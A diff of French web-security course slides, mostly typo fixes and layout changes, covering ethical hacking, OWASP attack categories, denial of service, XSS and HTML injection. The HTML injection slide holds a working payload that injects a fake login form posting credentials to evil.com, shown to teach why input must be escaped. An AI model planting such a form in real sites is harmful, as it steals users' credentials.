@@ -68,11 +68,13 @@ Le domaine de la sécurité est très vaste. Il regroupe des éléments plus lar
 
 > Trop de sécurité tue la sécurité.
 
-Quand le niveau de sécurité augmente, le niveau de confort descend (le plus souvent). Si le niveau de sécurité en place est trop fort, les utilisateurs mettrons en place des moyens dérivés qui ruinerons le travail effectué.
-Une fois que vous aurez acquis des connaissances en terme de sécurité, il faudra être capable de les doser et de les relativiser par rapport à une vision plus large du système d'information.
+Quand le niveau de sécurité augmente, le **niveau de confort descend** (le plus souvent).
+
+Si le niveau de sécurité en place est trop fort, les utilisateurs mettrons en place des moyens dérivés qui ruinerons le travail effectué.
 
 ![trouver le juste niveau difficile il sera](./too_much_security.jpg)
 
+Une fois que vous aurez acquis des connaissances en terme de sécurité, il faudra être capable de les doser et de les relativiser par rapport à une vision plus large du système d'information.
 
 --------------------------------------------------------------------------------
 
@@ -107,25 +109,25 @@ En dehors des robots qui scannent l'intégralité du net à la recherche de fail
 
 # Ethical Hacking
 
-Le savoir est ouvert, vous pouvez l'acquérir, y compris sur un des aspects de la création de programmes informatiques qui est **la sécurité**.
+En terme de **sécurité informatique** le savoir est ouvert et disponible.
 
- * vous pouvez l'utiliser pour participer à un projet créatif, être un **«maker»**, un hacker
- * vous pouvez l'utiliser de façon écervelée pour la simple jouissance sadique de la destruction...
- * vous pouvez aussi être amenés à passer du côté obscur pour des raisons professionnelles...
- 
+ * Il est facile d'acquérir très vite les principales connaissances
+ * Ce savoir peut être utiliser pour **créer** et **réparer** (makers, hackers) ou pour **détruire** (manque de maturité, retard de développement social et individuel, lulz, etc.)
+ * Peu d'enseignements officiels car ce double usage effraye
+    
 ![Le chemin vers le côté obscure de la force plus aisé est](./yoda.jpg)
+
+Du côté obscur de la force le chemin plus facile semble...
 
 --------------------------------------------------------------------------------
 
 # Ethical Hacking
 
-Pour ma part j'espère que toutes les connaissances que vous réussirez à acquérir seront utilisées pour créer et non le contraire.
+Pour ma part j'espère que toutes les connaissances que vous réussirez à acquérir seront utilisées pour créer et non le contraire.dd
 
-Ce savoir n'est pas complexe à apréhender. Il peut devenir complexe si l'on veut devenir un expert car il faut pouvoir apréhender un grand nombre de domaines. Mais il s'agit le plus souvent de recettes et d'habitudes à prendre, de contrôler des choses déjà compilées par vos pairs. La légende du génie adolescent qui est déjà capable de pirater des sites est très fausse sur de nombreux aspects, mais elle contient quelques éléments importants:
+Devenir un expert dans le domaine peut devenir complexe car il faut pouvoir apréhender un grand nombre de domaines.
 
- * il est facile d'acquérir très vite les principales connaissances
- * il faut être un peu trop jeune en terme de développement social et individuel pour imaginer se servir de cela pour le «lulz»
- * ces connaissances sont plus souvent apprises en auto-formation que via des enseignements officiels
+Mais il s'agit le plus souvent de recettes et d'habitudes à prendre, de contrôler des choses déjà compilées par vos pairs.
 
 --------------------------------------------------------------------------------
 
@@ -249,7 +251,7 @@ La grande différence entre du code produit par un débutant et celui produit pa
       $arr['bar'] = $bar;
     }
 
-Le code marche (il fais la tâche bizarre qui lui est demandé).
+Le code marche (il fait la tâche bizarre qui lui est demandé).
 
 Mais s'il est utilisé en dehors du cadre pour lequel il a été pensé, il peut échouer de façon plus ou moins brutale. Cela va de la génération de WARNING (accès à une clef non existante) au crash complet (accès à un attribut inexistant).
 
@@ -389,18 +391,18 @@ Quelques exemples de dénominations d'attaques tirés de **[owasp.org](http://ww
 
 Et quelques grandes catégories:
 
-  * Abuse of Functionality‎
+  * Abuse of Functionality
   * Data Structure Attacks
-  * Embedded Malicious Code‎
-  * Exploitation of Authentication‎
-  * Injection‎
-  * Path Traversal Attack‎
-  * Probabilistic Techniques‎
-  * Protocol Manipulation‎
-  * Resource Depletion‎
+  * Embedded Malicious Code
+  * Exploitation of Authentication
+  * Injection
+  * Path Traversal Attack
+  * Probabilistic Techniques
+  * Protocol Manipulation
+  * Resource Depletion
   * Resource Manipulation
-  * Sniffing Attacks‎
-  * Spoofing‎
+  * Sniffing Attacks
+  * Spoofing
 
 
 --------------------------------------------------------------------------------
@@ -440,16 +442,22 @@ Diffuser l'information pour mieux se protéger, mais aussi pour en comprendre le
 
 # Déni de service - DOS
 
-Le site web est rendu inaccessible, ce qui ouvre la voie aux concurrents ou au chantage.
-
-Il y a plusieurs vecteurs
+Le site web est rendu inaccessible, ce qui ouvre la voie aux concurrents ou au chantage. Il y a plusieurs vecteurs:
 
   * monopolisation des ressources (sockets, mémoire, processus serveur, disque dur, etc)
   * traitements trop longs (donc monopolisation du CPU)
   * destruction des ressources (crash serveur)
   * autres (cache poisonning, DNS poisoning, ...)
 
-Une variante : le DDOS, déni de service distribué ; la charge d'attaque est répartie sur un grand nombre de machines qui sont alors plus difficles à bloquer.
+![poussez-vous](./dos.jpg)
+
+--------------------------------------------------------------------------------
+
+# Déni de service - DOS
+
+Une variante : le DDOS, déni de service distribué ; la charge d'attaque est répartie sur un grand nombre de machines qui sont alors plus difficiles à bloquer.
+
+![503](./503.png)
 
 Du côté du développeur web, on pense souvent qu'il n'y a pas grand chose à faire, que c'est essentiellement aux couches d'administration système de trouver des parades. Mais en réalité un excès de confiance dans les paramètres recus par le programme est souvent en cause.
 
@@ -542,15 +550,18 @@ Et le résultat:
 ## Injection - HTML
 
 Pas grave? essayez:
-
     !html
     "><div class="big-overlay"></form>
     <form method="POST" action="http://www.evil.com">
-    <p class="secure">Please re-enter you credentials</p>
-    <label>Login:</label>
-    <ipnut type="text">
-    <label>Mot de passe:</label>
-    <input type="password"></div><foo "
+      <p class="secure">Please re-enter you credentials</p>
+      <label>Login:</label>
+        <input type="text">
+      <label>Mot de passe:</label>
+        <input type="password">
+    </div>
+    <foo "
+
+Et vous avez un formulaire de login détourné vers un autre site.
 
 --------------------------------------------------------------------------------
 
@@ -574,6 +585,8 @@ Et le résultat::
 En javascript on peut faire **tout** ce qui est imaginable en HTML, et **plus encore**. Détourner du contenu, poster des requêtes de façon transparentes, charger d'autres sources javascript depuis d'autres sites, etc.
 
 Le **XSS** (Cross Site Scripting) est votre pire ennemi.
+
+Les moteurs de **recherches** dans les sites et les codes 'SEO' sont très souvent sensibles.
 
 --------------------------------------------------------------------------------
 
@@ -867,12 +880,7 @@ Décomposez les tâches complexes en sous-ensemble simples, appréhendables
 
 Chacune de ces tâches peut être vue comme une boîte qui accepte des entrées et génère des sorties:
 
-                  +-----+
-     $arg2------->|XXXXX|
-     $arg1------->|XXXXX|-----> error code
-     $globals---->|XXXXX|--> exceptions
-                  |XXXXX|---------> $res1
-                  +-----+
+![Black Box 1](in_out.png)
 
 --------------------------------------------------------------------------------
 
@@ -880,24 +888,11 @@ Chacune de ces tâches peut être vue comme une boîte qui accepte des entrées 
 
 La boîte noire se décompose elle-même en un sous-ensemble de boîtes qui interagissent. Il y a des flux entrants et sortants pour chacune.
 
-    +-+        +-+ <-+----------+<----+-+---+
-    |X|--+---->|X|   |          |     |X|   |
-    +-+  |     +-+---+         +-+    +-+  +-+
-         |       |       +-+-->|X|-------->|X|
-        +-+      +------>|X|   +-+  +-+    +-+
-    --->|X|              +-+--------|X|------>(...)
-        +-+<------------/           +-+
+![Black Boxes](black_boxes.png)
 
 Ce principe est aussi applicable à l'ensemble. 
 
-        Requête HTTP
-        arguments du GET
-         |    |       +-----------+
-         |   Cookie-->|XXXXXXXXXXX|---------> Page Web HTML
-         +----------->|XXXXXXXXXXX|-----> SGBD
-           SGBD------>|XXXXXXXXXXX|--> fichiers CSV
-            Settings->|XXXXXXXXXXX|---------> Réponse JSON
-                      +-----------+
+![Black Box 1](in_out2.png)
 
 --------------------------------------------------------------------------------
 
